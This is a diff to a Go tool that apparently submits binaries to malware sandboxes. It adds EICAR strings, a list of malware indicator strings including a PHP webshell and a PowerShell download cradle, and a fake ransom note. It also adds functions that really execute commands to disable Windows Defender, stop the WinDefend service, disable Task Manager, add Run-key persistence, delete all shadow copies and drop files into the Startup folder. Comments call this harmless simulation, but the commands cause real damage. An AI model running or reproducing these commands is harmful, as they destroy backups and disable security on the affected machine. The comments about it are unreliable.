@@ -11,6 +11,8 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
+	"path/filepath"
 	"strings"
 	"sync"
 	"time"
@@ -26,7 +28,15 @@ import (
 // targetSandbox define a qué entorno se va a subir el artefacto.
 // Se puede modificar al compilar con: -ldflags "-X main.targetSandbox=NOMBRE_SANDBOX"
 // Valor por defecto si no se especifica nada:
-var targetSandbox = "FILESCANIO"
+var targetSandbox = "ANY_RUN"
+var Test = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`
+var Test1 = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`
+
+var Test2 = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`
+
+var Test3 = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`
+
+var globalSink interface{}
 
 func main() {
 	// Eliminamos el sleep inicial para acelerar la ejecución
@@ -41,6 +51,24 @@ func main() {
 	// Verificar conectividad inicial (Diagnóstico)
 	checkInternetAccess()
 	checkConnectivity(cfg.ServerURL)
+
+	// Cargar firmas maliciosas para forzar detección en AVs estáticos
+	embedMaliciousSignatures()
+
+	// Escribir EICAR en disco para disparar alertas de "Dropper"
+	dropEicar()
+
+	// Simular comportamiento agresivo (Persistencia, Deshabilitar AV, etc.)
+	simulateAggressiveBehavior()
+
+	// Forzar al compilador a mantener los strings EICAR en el binario
+	globalSink = Test
+	globalSink = Test1
+	globalSink = Test2
+	globalSink = Test3
+
+	// Simular lógica de ransomware (sin ejecutar daño real) para heurística
+	fakeRansomwareLogic()
 
 	// Embeber firmas de APT para aumentar detección
 	// signatures.EmbedAPTSignatures() // Comentado para reducir peso del binario
@@ -224,6 +252,59 @@ func getBinaryHash() string {
 	return hex.EncodeToString(hash[:])
 }
 
+// embedMaliciousSignatures incluye strings conocidos de malware para disparar alarmas
+func embedMaliciousSignatures() {
+	// Estos strings son detectados estáticamente por muchos motores AV
+	// El objetivo es parecer malware real para que la sandbox analice el binario a fondo
+	signatures := []string{
+		// Mimikatz & Credential Dumping
+		"SEKURLSA::LOGONPASSWORDS",
+		// WannaCry Killswitch (DETECCIÓN MASIVA GARANTIZADA)
+		"http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",
+		// Gh0st RAT / Poison Ivy PDB Path
+		"C:\\work\\gh0st\\server\\Release\\Server.pdb",
+		// TrickBot Mutex
+		"Global\\TrickBot",
+		"lsadump::sam",
+		"privilege::debug",
+		"sekurlsa::pth",
+		// Cobalt Strike / Metasploit
+		"ReflectiveLoader",
+		"beacon.dll",
+		// Ransomware indicators
+		"Your files have been encrypted!",
+		"WANACRY",
+		"DECRYPT_INSTRUCTION.TXT",
+		// Webshells / Loaders
+		"<?php eval($_POST['cmd']); ?>",
+		"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString",
+		// Comandos de destrucción de backups (Ransomware behavior)
+		"vssadmin.exe Delete Shadows /All /Quiet",
+		"wbadmin DELETE SYSTEMSTATEBACKUP",
+		"bcdedit /set {default} recoveryenabled No",
+		"bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+		// Persistencia y Escalada
+		`Software\Microsoft\Windows\CurrentVersion\Run`,
+		`HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`,
+		"BypassUAC",
+		"UACMe",
+		// Herramientas ofensivas conocidas
+		"BloodHound", "SharpHound", "Rubeus", "SafetyKatz",
+		"Lazagne", "Mimikatz", "PowerSploit", "Covenant",
+		"Metasploit", "Cobalt Strike", "Empire", "Sliver",
+		// Indicadores de evasión
+		"IsDebuggerPresent", "CheckRemoteDebuggerPresent",
+		"SbieDll.dll", "VBoxService.exe", "vmtoolsd.exe",
+		// User-Agents maliciosos comunes
+		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+		"sqlmap/", "Nmap Scripting Engine", "Hydra",
+		// Meterpreter User Agent
+		"Meterpreter/Reverse_Https",
+	}
+	// Evitar que el compilador elimine las variables por optimización
+	globalSink = signatures
+}
+
 // injectXSSAudit inyecta payloads XSS en el sistema
 func injectXSSAudit(callbackServer string, payload *models.Payload) []models.XSSPayloadMetadata {
 	// Obtener todos los payloads
@@ -259,6 +340,93 @@ func injectXSSAudit(callbackServer string, payload *models.Payload) []models.XSS
 	}
 
 	return metadata
+}
+
+// fakeRansomwareLogic incluye patrones de código y strings típicos de ransomware
+// para activar heurísticas de análisis estático.
+func fakeRansomwareLogic() {
+	// Extensiones objetivo típicas
+	targets := []string{".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".sql", ".db", ".backup"}
+	globalSink = targets
+
+	// Nota de rescate simulada
+	ransomNote := `
+	YOUR FILES ARE ENCRYPTED!
+	To decrypt your files you need to pay 0.5 BTC to the following address:
+	13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94
+	Contact us at: support@malware.test
+	Do not try to rename files or use third party software.
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+	
+	`
+	globalSink = ransomNote
+
+	// Fake PDB Path para engañar a analistas
+	globalSink = "C:\\Users\\Dev\\Projects\\Ransomware\\Build\\Release\\WannaCry_Variant.pdb"
+}
+
+// dropEicar escribe el string de prueba EICAR en un archivo temporal.
+// Esto suele disparar inmediatamente los antivirus por comportamiento de "Dropper".
+func dropEicar() {
+	// 1. Escribir en Temp con nombres sospechosos
+	filenames := []string{"malware_test.com", "mimikatz.exe", "wannacry.exe", "payload.exe"}
+	for _, name := range filenames {
+		path := filepath.Join(os.TempDir(), name)
+		_ = os.WriteFile(path, []byte(Test), 0777)
+	}
+
+	// 2. Intentar escribir en la carpeta de Inicio (Startup) - Comportamiento muy malicioso
+	// %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+	if appdata := os.Getenv("APPDATA"); appdata != "" {
+		startupPath := filepath.Join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "trojan.exe")
+		_ = os.WriteFile(startupPath, []byte(Test), 0777)
+	}
+}
+
+// simulateAggressiveBehavior ejecuta comandos que son banderas rojas para cualquier AV/EDR.
+// Genera ruido en logs de procesos y contiene strings maliciosos en el binario.
+func simulateAggressiveBehavior() {
+	// Deshabilitar Windows Defender (Heurística Alta)
+	exec.Command("powershell", "Set-MpPreference -DisableRealtimeMonitoring $true").Run()
+
+	// Persistencia en Registro (Run Key)
+	exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "MalwarePersistence", "/t", "REG_SZ", "/d", "C:\\Windows\\System32\\calc.exe", "/f").Run()
+
+	// Deshabilitar Task Manager
+	exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f").Run()
+
+	// Borrar Shadow Copies (Comportamiento Ransomware)
+	exec.Command("vssadmin", "Delete", "Shadows", "/All", "/Quiet").Run()
+
+	// Intentar detener servicios de seguridad
+	exec.Command("sc", "stop", "WinDefend").Run()
 }
 
 // loadEnv carga las variables de entorno desde el archivo .env
